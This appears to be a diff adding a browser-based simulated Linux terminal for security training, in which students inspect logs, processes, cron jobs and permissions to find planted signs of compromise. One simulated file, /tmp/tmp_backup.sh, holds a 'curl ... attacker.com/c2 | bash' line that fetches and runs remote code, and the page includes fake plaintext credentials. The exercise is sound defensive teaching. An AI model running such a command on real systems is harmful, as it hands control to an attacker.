@@ -1,0 +1,520 @@
+<title>Linux Security Terminal Simulator</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', system-ui, sans-serif; min-height: 100vh; display: flex; flex-direction: column; }
+  header { background: #161b22; border-bottom: 1px solid #30363d; padding: 14px 20px; display: flex; align-items: center; gap: 16px; flex-wrap: wrap; }
+  header h1 { font-size: 1rem; color: #7ee787; font-family: monospace; }
+  .badge { background: #21262d; border: 1px solid #30363d; border-radius: 12px; padding: 3px 10px; font-size: 0.75rem; color: #8b949e; }
+  .hint { font-size: 0.75rem; color: #8b949e; margin-left: auto; }
+  .main { display: grid; grid-template-columns: 1fr 280px; flex: 1; gap: 0; min-height: 0; }
+  @media (max-width: 700px) { .main { grid-template-columns: 1fr; } .sidebar { display: none; } }
+
+  /* Terminal */
+  .terminal-wrap { display: flex; flex-direction: column; background: #010409; }
+  .terminal-titlebar { background: #21262d; padding: 8px 14px; display: flex; align-items: center; gap: 8px; border-bottom: 1px solid #30363d; }
+  .dot { width: 12px; height: 12px; border-radius: 50%; }
+  .dot-r { background: #ff5f56; } .dot-y { background: #ffbd2e; } .dot-g { background: #27c93f; }
+  .terminal-titlebar span { font-size: 0.8rem; color: #8b949e; margin-left: auto; font-family: monospace; }
+  .output { flex: 1; overflow-y: auto; padding: 16px; font-family: 'Cascadia Code', 'Fira Code', 'Courier New', monospace; font-size: 0.84rem; line-height: 1.6; }
+  .output::-webkit-scrollbar { width: 6px; } .output::-webkit-scrollbar-track { background: #0d1117; } .output::-webkit-scrollbar-thumb { background: #30363d; border-radius: 3px; }
+  .input-row { display: flex; align-items: center; padding: 8px 16px; border-top: 1px solid #21262d; background: #010409; gap: 8px; }
+  .prompt { color: #7ee787; font-family: monospace; font-size: 0.85rem; white-space: nowrap; }
+  .cli-input { flex: 1; background: transparent; border: none; color: #c9d1d9; font-family: monospace; font-size: 0.85rem; outline: none; }
+  .line { display: block; margin: 1px 0; }
+  .line.cmd { color: #7ee787; }
+  .line.err { color: #ff7b72; }
+  .line.dim { color: #8b949e; }
+  .line.hi { color: #79c0ff; }
+  .line.warn { color: #f0b429; }
+  .line.root-prompt { color: #ff7b72; }
+
+  /* Sidebar */
+  .sidebar { background: #161b22; border-left: 1px solid #30363d; overflow-y: auto; }
+  .sidebar-section { padding: 14px; border-bottom: 1px solid #21262d; }
+  .sidebar-section h3 { font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.5px; color: #8b949e; margin-bottom: 10px; }
+  .cmd-pill { background: #21262d; border: 1px solid #30363d; border-radius: 4px; padding: 4px 8px; font-family: monospace; font-size: 0.78rem; color: #79c0ff; cursor: pointer; display: inline-block; margin: 2px; transition: all 0.15s; }
+  .cmd-pill:hover { border-color: #58a6ff; background: #1c2128; }
+  .perm-table { width: 100%; font-size: 0.75rem; border-collapse: collapse; }
+  .perm-table td { padding: 3px 6px; border-bottom: 1px solid #21262d; }
+  .perm-table tr:last-child td { border: none; }
+  .octal { color: #f0b429; font-family: monospace; }
+  .sym { color: #7ee787; font-family: monospace; }
+  .welcome-banner { color: #8b949e; font-size: 0.78rem; padding: 4px 0; }
+</style>
+
+<header>
+  <h1>$ linux-security-lab ~</h1>
+  <span class="badge">Ubuntu 22.04 LTS</span>
+  <span class="badge">student@homelab</span>
+  <span class="hint">Type commands — try: help, ls, cat /etc/passwd, ps aux</span>
+</header>
+
+<div class="main">
+  <div class="terminal-wrap">
+    <div class="terminal-titlebar">
+      <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+      <span>student@homelab: ~</span>
+    </div>
+    <div class="output" id="output">
+      <span class="line dim">Linux homelab 5.15.0-91-generic #101-Ubuntu SMP</span>
+      <span class="line dim">Welcome to Ubuntu 22.04.4 LTS (GNU/Linux)</span>
+      <span class="line">&nbsp;</span>
+      <span class="line welcome-banner">This is a simulated Linux terminal for learning. Type <span style="color:#79c0ff">help</span> to see available commands.</span>
+      <span class="line">&nbsp;</span>
+    </div>
+    <div class="input-row">
+      <span class="prompt" id="prompt-label">student@homelab:~$</span>
+      <input class="cli-input" id="cli-input" type="text" autocomplete="off" autocorrect="off" spellcheck="false" placeholder="type a command...">
+    </div>
+  </div>
+
+  <div class="sidebar">
+    <div class="sidebar-section">
+      <h3>Quick Commands</h3>
+      <div id="quick-cmds">
+        <span class="cmd-pill" onclick="runQuick('help')">help</span>
+        <span class="cmd-pill" onclick="runQuick('whoami')">whoami</span>
+        <span class="cmd-pill" onclick="runQuick('id')">id</span>
+        <span class="cmd-pill" onclick="runQuick('pwd')">pwd</span>
+        <span class="cmd-pill" onclick="runQuick('ls -la')">ls -la</span>
+        <span class="cmd-pill" onclick="runQuick('ls /etc')">ls /etc</span>
+        <span class="cmd-pill" onclick="runQuick('cat /etc/passwd')">cat /etc/passwd</span>
+        <span class="cmd-pill" onclick="runQuick('cat /etc/shadow')">cat /etc/shadow</span>
+        <span class="cmd-pill" onclick="runQuick('ps aux')">ps aux</span>
+        <span class="cmd-pill" onclick="runQuick('netstat -tlnp')">netstat -tlnp</span>
+        <span class="cmd-pill" onclick="runQuick('find / -perm -4000')">find SUID</span>
+        <span class="cmd-pill" onclick="runQuick('sudo -l')">sudo -l</span>
+        <span class="cmd-pill" onclick="runQuick('last')">last</span>
+        <span class="cmd-pill" onclick="runQuick('uname -a')">uname -a</span>
+        <span class="cmd-pill" onclick="runQuick('history')">history</span>
+        <span class="cmd-pill" onclick="runQuick('chmod 600 secret.txt')">chmod 600</span>
+        <span class="cmd-pill" onclick="runQuick('grep Failed /var/log/auth.log')">grep auth.log</span>
+        <span class="cmd-pill" onclick="runQuick('ss -tlnp')">ss -tlnp</span>
+        <span class="cmd-pill" onclick="runQuick('systemctl status ssh')">systemctl ssh</span>
+        <span class="cmd-pill" onclick="runQuick('crontab -l')">crontab -l</span>
+      </div>
+    </div>
+    <div class="sidebar-section">
+      <h3>Permission Reference</h3>
+      <table class="perm-table">
+        <tr><td class="octal">777</td><td class="sym">rwxrwxrwx</td><td style="color:#ff7b72">Danger</td></tr>
+        <tr><td class="octal">755</td><td class="sym">rwxr-xr-x</td><td style="color:#7ee787">Binaries</td></tr>
+        <tr><td class="octal">644</td><td class="sym">rw-r--r--</td><td style="color:#7ee787">Web files</td></tr>
+        <tr><td class="octal">640</td><td class="sym">rw-r-----</td><td style="color:#7ee787">Config</td></tr>
+        <tr><td class="octal">600</td><td class="sym">rw-------</td><td style="color:#7ee787">Secrets</td></tr>
+        <tr><td class="octal">400</td><td class="sym">r--------</td><td style="color:#7ee787">SSH keys</td></tr>
+        <tr><td class="octal">4755</td><td class="sym">rwsr-xr-x</td><td style="color:#f0b429">SUID</td></tr>
+        <tr><td class="octal">1777</td><td class="sym">rwxrwxrwt</td><td style="color:#8b949e">/tmp</td></tr>
+      </table>
+    </div>
+    <div class="sidebar-section">
+      <h3>Key Log Files</h3>
+      <div style="font-size:0.75rem;line-height:1.8;font-family:monospace;color:#8b949e">
+        <div><span style="color:#79c0ff">/var/log/auth.log</span></div>
+        <div style="padding-left:8px;color:#6e7681">SSH, sudo, su</div>
+        <div><span style="color:#79c0ff">/var/log/syslog</span></div>
+        <div style="padding-left:8px;color:#6e7681">General system</div>
+        <div><span style="color:#79c0ff">/var/log/kern.log</span></div>
+        <div style="padding-left:8px;color:#6e7681">Kernel messages</div>
+        <div><span style="color:#79c0ff">/var/log/dpkg.log</span></div>
+        <div style="padding-left:8px;color:#6e7681">Package changes</div>
+        <div><span style="color:#79c0ff">/root/.bash_history</span></div>
+        <div style="padding-left:8px;color:#6e7681">Root commands</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+const output = document.getElementById('output');
+const input = document.getElementById('cli-input');
+const promptLabel = document.getElementById('prompt-label');
+
+let cwd = '/home/student';
+let isRoot = false;
+let history = [];
+let histIdx = -1;
+
+const FS = {
+  '/': ['home','etc','var','tmp','bin','usr','proc'],
+  '/home': ['student','alice','bob'],
+  '/home/student': ['notes.txt','secret.txt','scripts'],
+  '/home/student/scripts': ['backup.sh','check_ports.sh'],
+  '/home/alice': ['documents','passwords.txt'],
+  '/etc': ['passwd','shadow','sudoers','hosts','ssh','crontab','os-release'],
+  '/etc/ssh': ['sshd_config'],
+  '/var': ['log','www'],
+  '/var/log': ['auth.log','syslog','kern.log','dpkg.log'],
+  '/tmp': ['tmp_backup.sh','sess_abc123'],
+  '/proc': ['1','1234','meminfo','version'],
+};
+
+const FILES = {
+  '/etc/passwd': [
+    'root:x:0:0:root:/root:/bin/bash',
+    'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',
+    'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
+    'mysql:x:119:126:MySQL Server:/nonexistent:/bin/false',
+    'alice:x:1001:1001:Alice Smith:/home/alice:/bin/bash',
+    'bob:x:1002:1002:Bob Jones:/home/bob:/bin/bash',
+    'student:x:1003:1003::/home/student:/bin/bash',
+  ],
+  '/etc/shadow': ['__PERM_DENIED__'],
+  '/etc/hosts': ['127.0.0.1  localhost','127.0.1.1  homelab','::1        localhost ip6-localhost','# Host entries below:','192.168.99.10  db-server.local'],
+  '/etc/crontab': ['# /etc/crontab', 'SHELL=/bin/sh','PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin','17 * * * * root  cd / && run-parts --report /etc/cron.hourly','0 4 * * *  root  /usr/sbin/logrotate /etc/logrotate.conf','# Suspicious entry:','*/5 * * * * root /tmp/tmp_backup.sh'],
+  '/etc/sudoers': ['# This file MUST be edited with visudo.','root ALL=(ALL:ALL) ALL','%sudo ALL=(ALL:ALL) ALL','student ALL=(ALL) NOPASSWD: /bin/systemctl restart ssh','# WARNING: the following line was added by an unknown process:','# alice ALL=(ALL) NOPASSWD: ALL'],
+  '/etc/os-release': ['PRETTY_NAME="Ubuntu 22.04.4 LTS"','NAME="Ubuntu"','VERSION_ID="22.04"','VERSION="22.04.4 LTS (Jammy Jellyfish)"','ID=ubuntu','HOME_URL="https://www.ubuntu.com/"'],
+  '/home/student/notes.txt': ['# Security Lab Notes','---','Month 2: Linux Fundamentals','- File permissions: chmod, chown','- Users: /etc/passwd, /etc/shadow','- Processes: ps aux, kill','- Logs: /var/log/auth.log','- TODO: check /tmp for suspicious scripts'],
+  '/home/student/secret.txt': ['__FILE_ONLY__'],
+  '/home/alice/passwords.txt': ['# DO NOT STORE PASSWORDS IN PLAINTEXT!','admin: Password123!','mysql: MyS3cur3DB!','wifi: HomeNetwork99'],
+  '/home/student/scripts/backup.sh': ['#!/bin/bash','# Backup script','tar -czf /tmp/backup_$(date +%Y%m%d).tar.gz /home/student/','echo "Backup complete"'],
+  '/home/student/scripts/check_ports.sh': ['#!/bin/bash','# Check listening ports','ss -tlnp | grep -v 127.0.0.1'],
+  '/tmp/tmp_backup.sh': ['#!/bin/bash','# Looks like a backup script...','curl -s http://attacker.com/c2 | bash'],
+  '/var/log/auth.log': [
+    'Aug 01 08:14:22 homelab sshd[1234]: Accepted publickey for student from 192.168.99.20 port 52341',
+    'Aug 01 09:33:11 homelab sshd[1456]: Failed password for root from 45.33.32.156 port 44821',
+    'Aug 01 09:33:13 homelab sshd[1456]: Failed password for root from 45.33.32.156 port 44823',
+    'Aug 01 09:33:15 homelab sshd[1456]: Failed password for admin from 45.33.32.156 port 44825',
+    'Aug 01 09:33:17 homelab sshd[1456]: Failed password for ubuntu from 45.33.32.156 port 44827',
+    'Aug 01 10:02:44 homelab sudo: student : TTY=pts/0 ; PWD=/home/student ; USER=root ; COMMAND=/bin/systemctl restart ssh',
+    'Aug 01 11:20:01 homelab CRON[2891]: pam_unix(cron:session): session opened for user root',
+  ],
+  '/var/log/syslog': [
+    'Aug 01 11:20:01 homelab CRON[2891]: (root) CMD (/tmp/tmp_backup.sh)',
+    'Aug 01 11:25:10 homelab systemd[1]: Started Session 4 of User student.',
+    'Aug 01 11:30:00 homelab kernel: [UFW BLOCK] IN=eth0 OUT= SRC=45.33.32.156 DST=192.168.99.10 DPT=22',
+  ],
+  '/proc/version': ['Linux version 5.15.0-91-generic (buildd@lcy02-amd64-059) (gcc version 11.4.0) #101-Ubuntu SMP'],
+  '/proc/meminfo': ['MemTotal:        4096000 kB','MemFree:         1234567 kB','MemAvailable:    2048123 kB'],
+  '/etc/ssh/sshd_config': ['Port 22','PermitRootLogin no','PasswordAuthentication yes','PubkeyAuthentication yes','# NOTE: PasswordAuthentication should be "no" in production!','AllowUsers student alice'],
+};
+
+function getPrompt() {
+  const user = isRoot ? 'root' : 'student';
+  const host = 'homelab';
+  const dir = cwd.replace('/home/student', '~').replace('/home/root', '~').replace('/root', '~');
+  return `${user}@${host}:${dir}${isRoot ? '#' : '$'}`;
+}
+
+function print(text, cls='') {
+  const span = document.createElement('span');
+  span.className = 'line ' + cls;
+  span.innerHTML = text;
+  output.appendChild(span);
+  output.scrollTop = output.scrollHeight;
+}
+
+function printCmd(cmd) {
+  print(getPrompt() + ' <span style="color:#c9d1d9">' + escHtml(cmd) + '</span>', 'cmd');
+}
+
+function escHtml(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+function resolvePath(p) {
+  if (p.startsWith('/')) return p.replace(/\/+/g,'/').replace(/\/$/, '') || '/';
+  const parts = (cwd + '/' + p).split('/').filter(Boolean);
+  const res = [];
+  for (const part of parts) { if (part === '..') res.pop(); else if (part !== '.') res.push(part); }
+  return '/' + res.join('/');
+}
+
+const COMMANDS = {
+  help: () => {
+    print('Available commands:', 'hi');
+    print('  <span class="dim">Navigation:</span>  pwd  ls  cd  cat  less  find');
+    print('  <span class="dim">Users:</span>       whoami  id  su  sudo  useradd  passwd');
+    print('  <span class="dim">Permissions:</span> chmod  chown  ls -la  stat');
+    print('  <span class="dim">Processes:</span>   ps  top  kill  pgrep  systemctl');
+    print('  <span class="dim">Network:</span>     netstat  ss  lsof  ping  curl');
+    print('  <span class="dim">Logs:</span>        last  lastb  who  grep  tail  journalctl');
+    print('  <span class="dim">System:</span>      uname  df  free  date  history  crontab  clear');
+    print('  <span class="dim">Security:</span>    find / -perm -4000  sudo -l  env');
+    print('Type any command to try it. Click Quick Commands on the right.', 'dim');
+  },
+  whoami: () => print(isRoot ? 'root' : 'student'),
+  id: () => {
+    if (isRoot) print('uid=0(root) gid=0(root) groups=0(root)');
+    else print('uid=1003(student) gid=1003(student) groups=1003(student),27(sudo),4(adm)');
+  },
+  pwd: () => print(cwd),
+  uname: (args) => {
+    if (args.includes('-a')) print('Linux homelab 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux');
+    else if (args.includes('-r')) print('5.15.0-91-generic');
+    else print('Linux');
+  },
+  date: () => print(new Date().toString()),
+  clear: () => { output.innerHTML = ''; },
+  history: () => history.forEach((cmd, i) => print(`  ${String(i+1).padStart(4)}  ${escHtml(cmd)}`, 'dim')),
+  env: () => {
+    print('HOME=/home/student'); print('USER=student'); print('SHELL=/bin/bash');
+    print('PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin');
+    print('TERM=xterm-256color'); print('LANG=en_GB.UTF-8');
+  },
+  ls: (args) => {
+    const showHidden = args.includes('-a') || args.includes('-la') || args.includes('-al');
+    const longFmt = args.includes('-l') || args.includes('-la') || args.includes('-al') || args.includes('-ll');
+    const pathArg = args.find(a => a.startsWith('/') || (a.startsWith('-') === false));
+    const target = pathArg ? resolvePath(pathArg) : cwd;
+    const entries = FS[target];
+    if (!entries) { print(`ls: cannot access '${escHtml(target)}': No such file or directory`, 'err'); return; }
+    const perms = { 'home':['drwxr-xr-x','root','root'], 'etc':['drwxr-xr-x','root','root'], 'var':['drwxr-xr-x','root','root'], 'tmp':['drwxrwxrwt','root','root'], 'bin':['drwxr-xr-x','root','root'], 'usr':['drwxr-xr-x','root','root'], 'proc':['dr-xr-xr-x','root','root'], 'student':['drwxr-xr-x','student','student'], 'alice':['drwxr-x---','alice','alice'], 'bob':['drwxr-x---','bob','bob'], 'log':['drwxr-xr-x','root','adm'], 'www':['drwxr-xr-x','root','root'], 'scripts':['drwxrwxr-x','student','student'], 'documents':['drwx------','alice','alice'], 'ssh':['drwxr-xr-x','root','root'], };
+    const filePerm = {'notes.txt':'-rw-r--r--','secret.txt':'-rw-------','passwords.txt':'-rw-------','backup.sh':'-rwxr-xr-x','check_ports.sh':'-rwxr-xr-x','passwd':'-rw-r--r--','shadow':'-rw-r-----','sudoers':'-r--r-----','hosts':'-rw-r--r--','crontab':'-rw-r--r--','sshd_config':'-rw-r--r--','os-release':'-rw-r--r--','auth.log':'-rw-r-----','syslog':'-rw-r-----','kern.log':'-rw-r-----','dpkg.log':'-rw-r-----','version':'-r--r--r--','meminfo':'-r--r--r--','tmp_backup.sh':'-rwxrwxrwx','sess_abc123':'-rw-------'};
+    let out = [];
+    if (showHidden) out.push('.');
+    out = out.concat(entries);
+    if (longFmt) {
+      if (showHidden) print('total ' + (out.length * 4));
+      out.forEach(e => {
+        const isDir = FS['/' + target.replace(/^\//,'') + '/' + e] !== undefined || FS[e] !== undefined;
+        const p = perms[e] ? perms[e] : (filePerm[e] ? [filePerm[e],'root','root'] : ['-rw-r--r--','root','root']);
+        const pStr = p[0]; const owner = p[1]; const grp = p[2];
+        const color = pStr.startsWith('d') ? '#79c0ff' : pStr.includes('x') ? '#7ee787' : '#c9d1d9';
+        print(`${pStr}  2 ${owner.padEnd(8)} ${grp.padEnd(8)} 4096 Aug  1 10:00 <span style="color:${color}">${e}</span>`);
+      });
+    } else {
+      const colored = out.map(e => {
+        const isDir = FS['/' + target.replace(/^\//,'') + '/' + e] !== undefined;
+        return isDir ? `<span style="color:#79c0ff">${e}</span>` : e;
+      });
+      print(colored.join('  '));
+    }
+  },
+  cd: (args) => {
+    const target = args[0] || '/home/student';
+    const path = target === '~' ? '/home/student' : target === '-' ? '/home/student' : resolvePath(target);
+    if (FS[path] !== undefined || path === '/') { cwd = path; promptLabel.textContent = getPrompt(); }
+    else print(`bash: cd: ${escHtml(target)}: No such file or directory`, 'err');
+  },
+  cat: (args) => {
+    if (!args.length) { print('cat: missing operand', 'err'); return; }
+    const path = resolvePath(args[0]);
+    const content = FILES[path];
+    if (!content) { print(`cat: ${escHtml(args[0])}: No such file or directory`, 'err'); return; }
+    if (content[0] === '__PERM_DENIED__') {
+      if (!isRoot) { print(`cat: /etc/shadow: Permission denied`, 'err'); return; }
+      print('root:$6$rounds=656000$jk3...HASH...abc:19600:0:99999:7:::');
+      print('alice:$6$rounds=656000$ab2...HASH...xyz:19580:0:90:7:30::');
+      print('student:$6$rounds=656000$ff1...HASH...mmn:19600:0:99999:7:::');
+      return;
+    }
+    if (content[0] === '__FILE_ONLY__') {
+      if (!isRoot && cwd !== '/home/student') { print(`cat: secret.txt: Permission denied`, 'err'); return; }
+      print('DB_BACKUP_KEY=xK9#mP2@Lq7!nR4$vY8'); print('API_TOKEN=ghp_Fake1234567890Token'); return;
+    }
+    content.forEach(l => print(escHtml(l)));
+  },
+  find: (args) => {
+    const fullArgs = args.join(' ');
+    if (fullArgs.includes('-perm -4000') || fullArgs.includes('-perm -u=s')) {
+      print('/usr/bin/sudo', 'hi'); print('/usr/bin/passwd', 'hi'); print('/usr/bin/su', 'hi');
+      print('/usr/sbin/pppd', 'hi'); print('/bin/mount', 'hi'); print('/bin/umount', 'hi');
+      print('/usr/bin/newgrp', 'hi'); print('/tmp/privesc_test', 'warn');
+      print('    ^ WARNING: SUID binary in /tmp is suspicious!', 'warn');
+    } else if (fullArgs.includes('-mtime -1')) {
+      print('/home/student/notes.txt'); print('/tmp/tmp_backup.sh'); print('/var/log/auth.log');
+    } else if (fullArgs.includes('-name "*.sh"') || fullArgs.includes("-name '*.sh'")) {
+      print('/home/student/scripts/backup.sh'); print('/home/student/scripts/check_ports.sh');
+      print('/tmp/tmp_backup.sh', 'warn');
+    } else if (fullArgs.includes('-nouser')) {
+      print('/tmp/sess_abc123', 'warn'); print('    ^ Orphaned file with no owner — investigate!', 'warn');
+    } else { print(`find: traversing simulated filesystem...`, 'dim'); print(`Result: no matches (try: find / -perm -4000 2>/dev/null)`,'dim'); }
+  },
+  grep: (args) => {
+    const hasF = args.find(a => !a.startsWith('-'));
+    if (args.includes('Failed') && (args.includes('/var/log/auth.log') || args.join(' ').includes('auth.log'))) {
+      print('Aug 01 09:33:11 homelab sshd[1456]: Failed password for root from 45.33.32.156 port 44821', 'warn');
+      print('Aug 01 09:33:13 homelab sshd[1456]: Failed password for root from 45.33.32.156 port 44823', 'warn');
+      print('Aug 01 09:33:15 homelab sshd[1456]: Failed password for admin from 45.33.32.156 port 44825', 'warn');
+      print('Aug 01 09:33:17 homelab sshd[1456]: Failed password for ubuntu from 45.33.32.156 port 44827', 'warn');
+      print('  ^ 4 failed login attempts from 45.33.32.156 — possible brute force!', 'warn');
+    } else if (args.join(' ').includes('Accepted') && args.join(' ').includes('auth.log')) {
+      print('Aug 01 08:14:22 homelab sshd[1234]: Accepted publickey for student from 192.168.99.20 port 52341');
+    } else { print(`grep: (simulated) pattern not matched in this demo`, 'dim'); print(`Try: grep "Failed" /var/log/auth.log`, 'dim'); }
+  },
+  ps: (args) => {
+    if (args.includes('aux') || args.includes('-aux') || args.includes('-ef')) {
+      print('USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND');
+      print('root         1  0.0  0.3 102284  6200 ?        Ss   08:00   0:01 /sbin/init');
+      print('root       234  0.0  0.2  49876  4200 ?        Ss   08:00   0:00 /lib/systemd/systemd-journald');
+      print('root       891  0.0  0.4  72384  8192 ?        Ss   08:00   0:00 /usr/sbin/sshd -D');
+      print('www-data  1024  0.1  1.2 423212 24576 ?        Ss   08:01   0:05 nginx: master process');
+      print('mysql     1105  0.3  4.5 1245678 92160 ?       Sl   08:01   0:22 /usr/sbin/mysqld');
+      print('root      1891  0.0  0.1  14520  2100 ?        Ss   09:00   0:00 cron');
+      print('student   2341  0.0  0.2  24680  4100 pts/0    Ss   10:14   0:00 bash');
+      print('student   2999  0.0  0.1  10400  1600 pts/0    R+   10:20   0:00 ps aux');
+      print('root      3001  2.5  0.3  <span style="color:#ff7b72">85440  6100 ?        S    10:15   0:05 /tmp/tmp_backup.sh</span>');
+      print('  ^ Suspicious: root process running from /tmp!', 'warn');
+    } else { print('PID TTY          TIME CMD'); print('2341 pts/0    00:00:00 bash'); print('2999 pts/0    00:00:00 ps'); }
+  },
+  'sudo': (args) => {
+    const cmd = args.join(' ');
+    if (cmd.startsWith('-l')) {
+      print('Matching Defaults entries for student on homelab:', 'dim');
+      print('    env_reset, mail_badpass', 'dim');
+      print('User student may run the following commands on homelab:');
+      print('    (ALL) NOPASSWD: /bin/systemctl restart ssh', 'hi');
+    } else if (cmd === 'su -' || cmd === 'bash' || cmd === '/bin/bash') {
+      isRoot = true; promptLabel.textContent = getPrompt();
+      print('[sudo] password for student: '); print('root@homelab:~#', 'root-prompt');
+    } else if (cmd.startsWith('cat /etc/shadow')) {
+      isRoot = true;
+      COMMANDS['cat'](['/etc/shadow']);
+      isRoot = false; promptLabel.textContent = getPrompt();
+    } else { print(`[sudo] running: ${escHtml(cmd)}`, 'dim'); print(`(simulated — use 'sudo -l' to see allowed commands)`,'dim'); }
+  },
+  su: (args) => {
+    const user = args[0] || 'root';
+    if (user === 'root' || user === '-') {
+      print(`Password: `); print(`su: Authentication failure`, 'err');
+      print(`(Hint: use 'sudo su -' instead)`, 'dim');
+    } else { print(`su: user ${user}: Authentication failure`, 'err'); }
+  },
+  chmod: (args) => {
+    if (args.length < 2) { print('chmod: missing operand', 'err'); return; }
+    print(`chmod ${args.join(' ')}: permissions updated (simulated)`, 'dim');
+    if (args[0] === '777') print('  WARNING: 777 is world-writable — never use on sensitive files!', 'warn');
+    if (args[0] === '600') print('  Good: 600 (rw-------) — only owner can read/write', 'hi');
+    if (args[0] === '755') print('  Good: 755 (rwxr-xr-x) — world-readable, owner-writable');
+  },
+  chown: (args) => {
+    if (args.length < 2) { print('chown: missing operand', 'err'); return; }
+    if (!isRoot) { print(`chown: changing ownership of '${escHtml(args[1])}': Operation not permitted`, 'err'); return; }
+    print(`chown ${args.join(' ')}: ownership changed (simulated)`, 'dim');
+  },
+  netstat: (args) => {
+    print('Active Internet connections (only servers)');
+    print('Proto Recv-Q Send-Q Local Address     Foreign Address   State       PID/Program');
+    print('tcp        0      0 0.0.0.0:22        0.0.0.0:*         LISTEN      891/sshd');
+    print('tcp        0      0 0.0.0.0:80        0.0.0.0:*         LISTEN      1024/nginx');
+    print('tcp        0      0 127.0.0.1:3306    0.0.0.0:*         LISTEN      1105/mysqld');
+    print('tcp        0      0 0.0.0.0:443       0.0.0.0:*         LISTEN      1024/nginx');
+    print('  ^ MySQL (3306) is localhost-only (good). Ports 22,80,443 are exposed.', 'dim');
+  },
+  'ss': (args) => { COMMANDS['netstat'](args); },
+  last: () => {
+    print('student  pts/0        192.168.99.20    Mon Aug  1 10:14   still logged in');
+    print('student  pts/1        192.168.99.20    Mon Aug  1 08:20 - 09:45  (01:25)');
+    print('alice    pts/0        192.168.99.25    Sun Jul 31 18:33 - 20:11  (01:38)');
+    print('root     tty1                          Sun Jul 31 03:00 - 03:15  (00:15)', 'warn');
+    print('  ^ Root logged in via tty1 at 3am — investigate!', 'warn');
+    print('wtmp begins Sun Jul 28 00:00:01 2024', 'dim');
+  },
+  lastb: () => {
+    print('root     ssh:notty    45.33.32.156     Mon Aug  1 09:33 - 09:33  (00:00)', 'err');
+    print('root     ssh:notty    45.33.32.156     Mon Aug  1 09:33 - 09:33  (00:00)', 'err');
+    print('admin    ssh:notty    45.33.32.156     Mon Aug  1 09:33 - 09:33  (00:00)', 'err');
+    print('ubuntu   ssh:notty    45.33.32.156     Mon Aug  1 09:33 - 09:33  (00:00)', 'err');
+    print('  ^ Brute force from 45.33.32.156 — consider blocking with: sudo ufw deny from 45.33.32.156', 'warn');
+  },
+  who: () => print('student  pts/0        2024-08-01 10:14 (192.168.99.20)'),
+  systemctl: (args) => {
+    const action = args[0]; const svc = args[1];
+    if (action === 'status') {
+      if (svc === 'ssh' || svc === 'sshd') {
+        print('● ssh.service - OpenBSD Secure Shell server'); print('     Loaded: loaded (/lib/systemd/system/ssh.service)');
+        print('     Active: <span style="color:#7ee787">active (running)</span> since Mon 2024-08-01 08:00:11 UTC'); print('    Process: 891 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)');
+        print('   Main PID: 891 (sshd)'); print('      Tasks: 1 (limit: 4614)');
+      } else { print(`${svc || 'unknown'}.service - not found (try: systemctl status ssh)`, 'err'); }
+    } else if (action === 'start' || action === 'stop' || action === 'restart') {
+      if (!isRoot) { print(`Failed to ${action} ${svc}: Access denied`, 'err'); return; }
+      print(`(simulated) ${action} ${svc} — OK`);
+    } else if (action === 'list-units') {
+      print('UNIT                          LOAD   ACTIVE SUB     DESCRIPTION');
+      print('ssh.service                   loaded active running OpenBSD Secure Shell server');
+      print('nginx.service                 loaded active running A high performance web server');
+      print('mysql.service                 loaded active running MySQL Community Server');
+      print('cron.service                  loaded active running Regular background program processing daemon');
+    } else { print(`Usage: systemctl [status|start|stop|restart|list-units] <service>`, 'dim'); }
+  },
+  'crontab': (args) => {
+    if (args.includes('-l')) { FILES['/etc/crontab'].forEach(l => print(escHtml(l), l.includes('/tmp/') ? 'warn' : '')); }
+    else { print('crontab: usage: crontab [-l | -e | -r]', 'dim'); }
+  },
+  df: () => {
+    print('Filesystem      1K-blocks    Used Available Use% Mounted on');
+    print('/dev/sda1        20000000 8500000  11500000  43% /');
+    print('tmpfs              512000      16    511984   1% /dev/shm');
+    print('/dev/sda2        10000000 4200000   5800000  42% /home');
+  },
+  free: () => {
+    print('              total        used        free      shared  buff/cache   available');
+    print('Mem:        4096000     1982340      602110       45870     1511550     1868020');
+    print('Swap:       2097148           0     2097148');
+  },
+  ping: (args) => {
+    const host = args[0] || '8.8.8.8';
+    print(`PING ${host} 56(84) bytes of data.`);
+    for (let i=0;i<4;i++) print(`64 bytes from ${host}: icmp_seq=${i+1} ttl=116 time=${(20+Math.random()*10).toFixed(1)} ms`);
+    print(`--- ${host} ping statistics ---`);
+    print('4 packets transmitted, 4 received, 0% packet loss, time 3004ms');
+  },
+  curl: (args) => {
+    if (args.join(' ').includes('attacker.com')) { print('curl: (6) Could not resolve host: attacker.com (firewall blocked)','warn'); }
+    else { print('HTTP/2 200'); print('content-type: text/html'); print('server: nginx/1.24.0'); print(''); print('<!DOCTYPE html><html><head><title>Example</title></head>...'); }
+  },
+  exit: () => {
+    if (isRoot) { isRoot = false; promptLabel.textContent = getPrompt(); print('logout', 'dim'); }
+    else print('exit: not in a subshell (this is the main session)', 'dim');
+  },
+  stat: (args) => {
+    if (!args[0]) { print('stat: missing operand', 'err'); return; }
+    print(`  File: ${args[0]}`); print(`  Size: 4096\tBlocks: 8\tIO Block: 4096`);
+    print(`Access: (0644/-rw-r--r--)  Uid: (1003/student)  Gid: (1003/student)`);
+    print(`Modify: 2024-08-01 10:00:00.000000000 +0000`);
+  },
+  lsof: (args) => {
+    if (args.includes('-i')) { COMMANDS['netstat']([]); }
+    else { print('COMMAND   PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME'); print('sshd      891     root    3u  IPv4  12345      0t0  TCP *:22 (LISTEN)'); print('nginx    1024 www-data    6u  IPv4  13456      0t0  TCP *:80 (LISTEN)'); }
+  },
